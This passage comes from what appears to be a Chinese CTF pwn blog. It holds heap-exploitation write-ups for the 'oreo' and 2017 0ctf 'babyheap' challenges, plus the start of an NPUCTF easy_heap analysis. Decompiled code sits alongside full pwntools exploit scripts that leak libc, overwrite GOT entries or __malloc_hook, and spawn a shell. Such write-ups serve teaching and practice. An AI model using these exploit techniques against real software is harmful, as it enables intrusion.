<h4 id="Show-current-stat函数如下："><a href="#Show-current-stat函数如下：" class="headerlink" title="Show_current_stat函数如下："></a>Show_current_stat函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_804898D()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  puts(&quot;What would you like to do?\n&quot;);</span><br><span class="line">  printf(&quot;%u. Add new rifle\n&quot;, 1);</span><br><span class="line">  printf(&quot;%u. Show added rifles\n&quot;, 2);</span><br><span class="line">  printf(&quot;%u. Order selected rifles\n&quot;, 3);</span><br><span class="line">  printf(&quot;%u. Leave a Message with your Order\n&quot;, 4);</span><br><span class="line">  printf(&quot;%u. Show current stats\n&quot;, 5);</span><br><span class="line">  printf(&quot;%u. Exit!\n&quot;, 6);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( get_number() )</span><br><span class="line">    &#123;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">      case 1:</span><br><span class="line">        Add_new_rifle();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        Show_added_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        Enter_Message();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        Show_current_stats();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        return *MK_FP(__GS__, 20) ^ v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add函数中 <code>*((_DWORD *)last_heap + 13) = v1;</code>将<code>last_heap</code>指针的地址写到了last_heap + 52的地方(4*13)，接着这里让输入name，我们发现<code>fgets(last_heap + 25, 56, stdin)</code>，这句代码从<code>last_heap + 25</code>开始输入，然后输入56个字符，而我们将<code>last_heap</code>指针的地址写到了last_heap + 52的地方，这就意味着我们可以改写这个指针。</p>
<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li><p>因为延迟绑定的缘故，我们首先需要调用一下free函数，然后再name输入的时候，将last_heap指针改写成free_got。</p>
</li>
<li><p>然后利用show函数，泄露libc</p>
</li>
<li><p>Enter_Message函数中<code>fgets(dword_804A2A8, 128, stdin);</code>这里的dword_804A2A8指的是这个地址里的数据指向的地方，我们可以伪造fake_chunk修改dword_804A2A8这个地址的数据让它指向got表，然后修改got表。</p>
</li>
<li><p>我们发现在bss段有一个number的计数指针，用来记录malloc的次数， <code>last_heap = (char *)malloc(0x38u);</code>这里可以知道，我们需要0x38+8大小的size，也就是0x40，也就是说我们需要malloc 40次。注意这里每个chunk，last_heap都要设置成NULL，因为在后面delete的时候是依次free，这样才不会将这些chunk放入fastbin中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0804A2A4 number          dd ?                   </span><br><span class="line">.bss:0804A2A4                                         </span><br><span class="line">.bss:0804A2A8 ; char *dword_804A2A8</span><br><span class="line">.bss:0804A2A8 dword_804A2A8   dd ?      &lt;---我们要修改的地方</span><br></pre></td></tr></table></figure>
</li>
<li><p>再添加一次chunk，将last_heap设置成0x0804a2a8，这样在free一次后会将指针设置成last_heap，再将其free放入fastbin，然后再次malloc出来，这里我们需要注意的是，在free的时候，程序会检查fake_chunk的next_size，所以这里我们需要伪造next_size。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20wx 0x804a2a4</span><br><span class="line">            (fake_size) (strlen_got)</span><br><span class="line">0x804a2a4:	0x00000040	0x0804a2c0	0x00000000	0x00000000</span><br><span class="line">0x804a2b4:	0x00000000	0x00000000	0x00000000	0x61616161</span><br><span class="line">0x804a2c4:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">                                    (last_heap)</span><br><span class="line">0x804a2d4:	0x61616161	0x61616161	0x00000000	0x61616161</span><br><span class="line">            (next_size)</span><br><span class="line">0x804a2e4:	0x00000064	0x0000000a	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后我们将last_heap再一次修改为strlen_got，将利用Enter_Message函数将system_addr和<code>/bin/sh\x00</code>写到strlen_got表里。这里要注意一下写法，<code>p32(system_addr)+&#39;;/bin/sh\x00&#39;</code>具体原理我就不解释了。</p>
</li>
</ol>
<h4 id="exp如下：-2"><a href="#exp如下：-2" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;oreo&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;oreo&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line">log.success(&#39;free_got: &#39; +hex(free_got))</span><br><span class="line">strlen_got&#x3D;elf.got[&#39;strlen&#39;]</span><br><span class="line"></span><br><span class="line">def add(name,content) :</span><br><span class="line">	#sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	#sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(name)</span><br><span class="line">	#sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def show() :</span><br><span class="line">	#sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line"></span><br><span class="line">def free() :</span><br><span class="line">	#sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">def message(message) :</span><br><span class="line">        #sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line">	#sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(message)</span><br><span class="line"></span><br><span class="line">def show_stats() :</span><br><span class="line">        #sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;5&#39;)</span><br><span class="line"></span><br><span class="line">add(&#39;L0ne1y&#39;,&#39;L0ne1y&#39;)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">name&#x3D;&#39;a&#39;*27+p32(free_got)</span><br><span class="line">add(name,&#39;L0ne1y&#39;)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">free_addr&#x3D;u32(sh.recv(4).ljust(4,&#39;\x00&#39;))</span><br><span class="line">log.success(&#39;free_addr: &#39;+hex(free_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;free&#39;,free_addr)</span><br><span class="line">libc_base&#x3D;free_addr-libc.dump(&#39;free&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">log.success(&#39;system_addr: &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">message_addr&#x3D;0x0804A2A8</span><br><span class="line">for i in range(0x40-2-1) :</span><br><span class="line">	add(&#39;a&#39;*27+p32(0),&#39;L0ne1y&#39;)</span><br><span class="line">add(&#39;a&#39;*27+p32(message_addr),&#39;L0ne1y&#39;)</span><br><span class="line">#show_stats()</span><br><span class="line">next_size&#x3D;&#39;a&#39;*(0x20-4)+p32(0) + &#39;a&#39;*4 + p32(100)   #这里的p32(0)是要将last_heap置零，有些不太理解，调试也没发现这里是last_heap</span><br><span class="line">message(next_size)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(&#39;L0ne1y&#39;,p32(strlen_got))</span><br><span class="line">message(p32(system_addr)+&#39;;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017_0ctf_babyheap"></a>2017_0ctf_babyheap</h3><h4 id="checksec检查-1"><a href="#checksec检查-1" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-2"><a href="#main函数如下：-2" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; rax@2</span><br><span class="line"></span><br><span class="line">  sub_B70();</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    v3 &#x3D; sub_138C();</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v3 &gt; 5 );</span><br><span class="line">  JUMPOUT(__CS__, dword_14F4 + dword_14F4[v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下：-2"><a href="#add函数如下：-2" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall add(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  signed int v2; &#x2F;&#x2F; [sp+14h] [bp-Ch]@3</span><br><span class="line">  void *v3; &#x2F;&#x2F; [sp+18h] [bp-8h]@6</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !*(24LL * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Size: &quot;);</span><br><span class="line">      v2 &#x3D; sub_138C();</span><br><span class="line">      if ( v2 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v2 &gt; 4096 )</span><br><span class="line">          v2 &#x3D; 4096;</span><br><span class="line">        v3 &#x3D; calloc(v2, 1uLL);</span><br><span class="line">        if ( !v3 )</span><br><span class="line">          exit(-1);</span><br><span class="line">        *(24LL * i + a1) &#x3D; 1;</span><br><span class="line">        *(a1 + 24LL * i + 8) &#x3D; v2;</span><br><span class="line">        *(a1 + 24LL * i + 16) &#x3D; v3;</span><br><span class="line">        printf(&quot;Allocate Index %d\n&quot;, i);</span><br><span class="line">      &#125;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 __fastcall edit(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; &#x2F;&#x2F; rax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+1Ch] [bp-4h]@4</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  result &#x3D; sub_138C();</span><br><span class="line">  v2 &#x3D; result;</span><br><span class="line">  if ( (result &amp; 0x80000000) &#x3D;&#x3D; 0LL &amp;&amp; result &lt;&#x3D; 15 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; *(24LL * result + a1);</span><br><span class="line">    if ( result &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Size: &quot;);</span><br><span class="line">      result &#x3D; sub_138C();</span><br><span class="line">      v3 &#x3D; result;</span><br><span class="line">      if ( result &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Content: &quot;);</span><br><span class="line">        result &#x3D; sub_11B2(*(24LL * v2 + a1 + 16), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下：-1"><a href="#show函数如下：-1" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed int __fastcall show(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int result; &#x2F;&#x2F; eax@1</span><br><span class="line">  signed int v2; &#x2F;&#x2F; [sp+1Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  result &#x3D; sub_138C();</span><br><span class="line">  v2 &#x3D; result;</span><br><span class="line">  if ( result &gt;&#x3D; 0 &amp;&amp; result &lt;&#x3D; 15 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; *(24LL * result + a1);</span><br><span class="line">    if ( result &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Content: &quot;);</span><br><span class="line">      sub_130F(*(24LL * v2 + a1 + 16), *(24LL * v2 + a1 + 8));</span><br><span class="line">      result &#x3D; puts(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下：-1"><a href="#free函数如下：-1" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall free_(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+1Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  result &#x3D; sub_138C();</span><br><span class="line">  v2 &#x3D; result;</span><br><span class="line">  if ( result &gt;&#x3D; 0 &amp;&amp; result &lt;&#x3D; 15 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; *(24LL * result + a1);</span><br><span class="line">    if ( result &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(24LL * v2 + a1) &#x3D; 0;</span><br><span class="line">      *(24LL * v2 + a1 + 8) &#x3D; 0LL;</span><br><span class="line">      free(*(24LL * v2 + a1 + 16));</span><br><span class="line">      result &#x3D; 24LL * v2 + a1;</span><br><span class="line">      *(result + 16) &#x3D; 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现在edit函数中，程序让我们输入size，指定输入长度，这样就造成了堆溢出。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为<code>\x00</code>。</p>
<h4 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>申请6个chunk，free掉1和2，利用0修改掉1的fd，使其指向0x80的chunk，然后连续malloc，这样就会拿到0x80的chunk地址了，这里要注意先修改0x80的chunk的size位，然后修改回size位，free掉0x80的chunk，然后利用show函数，泄露出<code>main_arena</code>地址</li>
<li>然后申请0x60的chunk，此时chunk2和刚申请回来的chunk的地址是一样的，我们再free掉，然后利用chunk2修改fd指针为<code>malloc_hook-0x23</code></li>
<li>然后连续malloc俩次，拿到<code>malloc_hook-0x23</code>为地址的fake_chunk，在malloc_hook处写入one_gadget，然后再一次malloc来getshell。</li>
</ol>
<h4 id="exp如下：-3"><a href="#exp如下：-3" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;babyheap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babyheap&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size) :</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,size,content) :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10) #0</span><br><span class="line">add(0x10) #1</span><br><span class="line">add(0x10) #2</span><br><span class="line">add(0x10) #3</span><br><span class="line">add(0x80) #4</span><br><span class="line">add(0x10) #5</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">edit(0,0x21,&#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;\x80&#39;) #1-&gt;4</span><br><span class="line">edit(3,0x20,&#39;a&#39;*0x10+p64(0)+p64(0x21))</span><br><span class="line">add(0x10) #1</span><br><span class="line">add(0x10) #2:-&gt;4</span><br><span class="line"></span><br><span class="line">edit(3,0x20,&#39;a&#39;*0x10+p64(0)+p64(0x91))</span><br><span class="line">free(4) </span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&#39;Content: \n&#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc_base&#x3D;main_arena-libc.symbols[&#39;__malloc_hook&#39;]-0x68</span><br><span class="line">#0x45216,0x4526a,0xf02a4,0xf1147</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">log.success(&#39;main_arena: &#39; +hex(main_arena))</span><br><span class="line">log.success(&#39;libc_base: &#39; +hex(libc_base))</span><br><span class="line">log.success(&#39;one_gadget: &#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(0x60) #4</span><br><span class="line">free(4)</span><br><span class="line">edit(2,0x8,p64(libc_base+libc.symbols[&#39;__malloc_hook&#39;]-0x23))</span><br><span class="line"></span><br><span class="line">add(0x60) #4</span><br><span class="line">add(0x60) #5</span><br><span class="line">edit(6,0x1b,&#39;a&#39;*0x13+p64(one_gadget))</span><br><span class="line">      </span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(sh) </span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





<p>参考链接：</p>
<p><a href="http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/" target="_blank" rel="noopener external nofollow noreferrer">http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/</a></p>
<p><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener external nofollow noreferrer">https://www.anquanke.com/post/id/85357</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>
<p><a href="http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#Roc826" target="_blank" rel="noopener external nofollow noreferrer">http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#Roc826</a></p>
<p><a href="https://bbs.pediy.com/thread-247214.htm" target="_blank" rel="noopener external nofollow noreferrer">https://bbs.pediy.com/thread-247214.htm</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>Fastbin Attack</tag>
        <tag>double free</tag>
        <tag>House Of Spirit</tag>
        <tag>Arbitrary Alloc</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF--PWN--WP复现</title>
    <url>/2020/05/14/NPUCTF-PWN-WP%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/XAYmHTfq8ogvKzw.png" alt="alt"></p>
<a id="more"></a>

<p>之前打的NPUCTF发现自己什么都不会，一直想着复现，拖了这么久，今天就复现一下。这次复现学到了很多，发现自己好菜。呜呜呜<del>~</del></p>
<h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+4h] [bp-Ch]@2</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(0, &amp;buf, 4uLL);</span><br><span class="line">    v3 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( (unsigned int)v3 &lt;&#x3D; 5 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Invalid Choice&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(__CS__, (char *)dword_401140 + dword_401140[(unsigned __int64)(unsigned int)v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="create-函数如下："><a href="#create-函数如下：" class="headerlink" title="create()函数如下："></a>create()函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 create()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; &#x2F;&#x2F; rbx@9</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+4h] [bp-2Ch]@1</span><br><span class="line">  size_t size; &#x2F;&#x2F; [sp+8h] [bp-28h]@6</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-20h]@6</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-18h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !heaparray[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      heaparray[i] &#x3D; malloc(0x10uLL);</span><br><span class="line">      if ( !heaparray[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Size of Heap(0x10 or 0x20 only) : &quot;);</span><br><span class="line">      read(0, &amp;buf, 8uLL);</span><br><span class="line">      size &#x3D; atoi(&amp;buf);</span><br><span class="line">      if ( size !&#x3D; 24 &amp;&amp; size !&#x3D; 56 )</span><br><span class="line">        exit(-1);</span><br><span class="line">      v0 &#x3D; heaparray[i];</span><br><span class="line">      v0[1] &#x3D; malloc(size);</span><br><span class="line">      if ( !*((_QWORD *)heaparray[i] + 1) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(2);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_QWORD *)heaparray[i] &#x3D; size;</span><br><span class="line">      printf(&quot;Content:&quot;, &amp;buf);</span><br><span class="line">      read_input(*((_QWORD *)heaparray[i] + 1), size);</span><br><span class="line">      puts(&quot;Done!&quot;);</span><br><span class="line">      return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, (char *)&amp;v1 + 4, 4uLL);</span><br><span class="line">  LODWORD(v1) &#x3D; atoi((const char *)&amp;v1 + 4);</span><br><span class="line">  if ( (signed int)v1 &lt; 0 || (signed int)v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( heaparray[(signed int)v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Content: &quot;, (char *)&amp;v1 + 4, v1);</span><br><span class="line">    read_input(*((_QWORD *)heaparray[(signed int)v1] + 1), *(_QWORD *)heaparray[(signed int)v1] + 1LL);   #off_by_one漏洞</span><br><span class="line">    puts(&quot;Done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;How Dare you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下："><a href="#show函数如下：" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 show()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, (char *)&amp;v1 + 4, 4uLL);</span><br><span class="line">  LODWORD(v1) &#x3D; atoi((const char *)&amp;v1 + 4);</span><br><span class="line">  if ( (signed int)v1 &lt; 0 || (signed int)v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( heaparray[(signed int)v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(</span><br><span class="line">      &quot;Size : %ld\nContent : %s\n&quot;,</span><br><span class="line">      *(_QWORD *)heaparray[(signed int)v1],</span><br><span class="line">      *((_QWORD *)heaparray[(signed int)v1] + 1),</span><br><span class="line">      v1);</span><br><span class="line">    puts(&quot;Done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;How Dare you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

